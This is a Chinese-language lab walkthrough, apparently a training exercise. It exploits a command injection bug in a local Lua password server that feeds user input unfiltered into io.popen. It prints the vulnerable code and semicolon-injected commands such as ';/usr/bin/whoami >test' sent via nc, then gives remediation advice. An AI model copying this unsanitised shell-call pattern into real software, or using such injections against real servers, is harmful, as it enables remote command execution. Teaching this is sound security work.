# linux下漏洞分析入门/center>

## 实验概述

### 【目的】
安装lua和luasocket，运行level12.lua脚本，利用漏洞远程执行任意指令。
### 【环境】
Linux
### 【工具】
nc
### 【原理】
远程代码执行漏洞：远程命令执行漏洞，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。
## 实验步骤

### 【步骤】
我们拿到的是一个lua脚本，首先需要在电脑上安装lua环境和所需要的luasocket模块。
安装lua：
```
sudo apt install lua5.1
```

安装luasocket：
```
sudo apt install luarocks
sudo luarocks install luasocket
```
现在就可以在终端上运行所给的lua脚本了
```
lua level19.lua
```
我们可以通过nc来访问：
```
$ nc 127.0.0.1 50001
Password: 

```
发现程序要求我们输入password。
切到lua脚本看源代码。
```
  1 local socket = require("socket")
  2 local server = assert(socket.bind("127.0.0.1", 50001))
  3 
  4 function hash(password)
  5   prog = io.popen("echo "..password.." | sha1sum", "r")
  6   data = prog:read("*all")
  7   prog:close()
  8 
  9   data = string.sub(data, 1, 40)
 10 
 11   return data
 12 end
 13 
 14 
 15 while 1 do
 16   local client = server:accept()
 17   client:send("Password: ")
 18   client:settimeout(60)
 19   local line, err = client:receive()
 20   if not err then
 21       print("trying " .. line) -- log from where ;\
 22       local h = hash(line)
 23 
 24       if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
 25           client:send("Better luck next time\n");
 26       else
 27           client:send("Congrats, your token is 413**CARRIER LOST**\n")
 28       end
 29 
 30   end
 31 
 32   client:close()
 33 end
~                                                                     
~                                   
```
可以看出，这里程序要求输入一个password，之后通过hash加密后与字符串`4754a4f4bd5787accd33de887b9250a0691dd198`进行对比，相等就认为输入了正确的密码。

需要注意的是，在函数hash()中，程序调用了popen()来得到加密后的字符串。
io.popen()##
原型：io.popen ([prog [, mode]])
解释：在额外的进程中启动程序prog，并返回用于prog的文件句柄。通俗的来说就是使用这个函数可以调用一个命令（程序），并且返回一个和这个程序相关的文件描述符，一般是这个被调用函数的输出结果，这个文件打开模式由参数mode确定，有取值"r"和"w"两种，分别表示以读、写方式打开，默认是以读的方式。

这里，程序用popen()调用了echo指令来吧password的值送入sha1sum处理并得到返回值。shell脚本的指令用`;`隔开，注意这里对于password没有任何过滤就送入了popen()，那么我们可以用`;`来隔断，从而运行任意指令。

```
$ nc 127.0.0.1 50001
Password: ;/usr/bin/whoami >test
Better luck next time
$ cat test
lometsj
$ nc 127.0.0.1 50001
Password: ;/bin/echo u got it > test
Better luck next time
$ cat test
u got it

```
### 【总结】

由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。

建议假定所有输入都是可疑的，尝试对所有输入提交可能执行命令的构造语句进行严格的检查或者控制外部输入，系统命令执行函数的参数不允许外部传递。
·不仅要验证数据的类型，还要验证其格式、长度、范围和内容。
·不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。
·对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。
·在发布应用程序之前测试所有已知的威胁。